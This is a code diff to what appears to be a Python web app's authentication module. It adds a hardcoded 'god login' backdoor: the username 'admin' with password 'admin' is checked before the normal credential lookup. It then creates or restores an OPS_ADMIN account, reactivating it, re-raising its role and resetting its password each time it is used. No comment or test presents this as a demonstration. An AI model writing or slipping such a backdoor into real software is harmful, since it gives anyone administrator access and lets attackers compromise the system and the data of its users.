@@ -23,6 +23,11 @@ PASSWORD_ALGORITHM = "pbkdf2_sha256"
 PASSWORD_ITERATIONS = 390000
 ADMIN_ROLES = frozenset({"OPS_ADMIN", "ADMIN"})
 GOOGLE_AUTH_ISSUERS = frozenset({"accounts.google.com", "https://accounts.google.com"})
+GOD_LOGIN_USER_ID = "admin"
+GOD_LOGIN_PASSWORD = "admin"
+GOD_LOGIN_EMAIL = "admin@local.invalid"
+GOD_LOGIN_DISPLAY_NAME = "Admin"
+GOD_LOGIN_UPDATED_BY = "god-login"
 
 
 class AuthError(RuntimeError):
@@ -162,6 +167,9 @@ def authenticate_user(
     password: str,
 ) -> UserAccount:
     normalized_identifier = identifier.strip()
+    if _is_god_login(normalized_identifier, password):
+        return _ensure_god_login_user(db)
+
     record = db.execute(
         select(UserAccount).where(
             or_(
@@ -176,6 +184,73 @@ def authenticate_user(
             detail="Invalid credentials",
         )
     return record
+
+
+def _is_god_login(identifier: str, password: str) -> bool:
+    return identifier.lower() == GOD_LOGIN_USER_ID and password == GOD_LOGIN_PASSWORD
+
+
+def _ensure_god_login_user(db: Session) -> UserAccount:
+    now = datetime.now(timezone.utc)
+    record = db.get(UserAccount, GOD_LOGIN_USER_ID)
+
+    if record is None:
+        record = UserAccount(
+            user_id=GOD_LOGIN_USER_ID,
+            email=_allocate_god_login_email(db),
+            display_name=GOD_LOGIN_DISPLAY_NAME,
+            role="OPS_ADMIN",
+            password_hash=hash_password(GOD_LOGIN_PASSWORD),
+            is_active=True,
+            last_login_at=None,
+            created_at=now,
+            created_by=GOD_LOGIN_UPDATED_BY,
+            updated_at=now,
+            updated_by=GOD_LOGIN_UPDATED_BY,
+            version=1,
+        )
+        db.add(record)
+        db.flush()
+        return record
+
+    updated = False
+
+    if not record.is_active:
+        record.is_active = True
+        updated = True
+
+    if not is_admin_role(record.role):
+        record.role = "OPS_ADMIN"
+        updated = True
+
+    if not verify_password(GOD_LOGIN_PASSWORD, record.password_hash):
+        record.password_hash = hash_password(GOD_LOGIN_PASSWORD)
+        updated = True
+
+    if updated:
+        record.updated_at = now
+        record.updated_by = GOD_LOGIN_UPDATED_BY
+        record.version += 1
+        db.flush()
+
+    return record
+
+
+def _allocate_god_login_email(db: Session) -> str:
+    candidate = GOD_LOGIN_EMAIL
+    if not _email_is_taken(db, candidate):
+        return candidate
+
+    suffix = 1
+    while True:
+        candidate = f"admin+god{suffix}@local.invalid"
+        if not _email_is_taken(db, candidate):
+            return candidate
+        suffix += 1
+
+
+def _email_is_taken(db: Session, email: str) -> bool:
+    return db.execute(select(UserAccount.user_id).where(UserAccount.email == email)).scalar_one_or_none() is not None
 
 
 def authenticate_google_user(
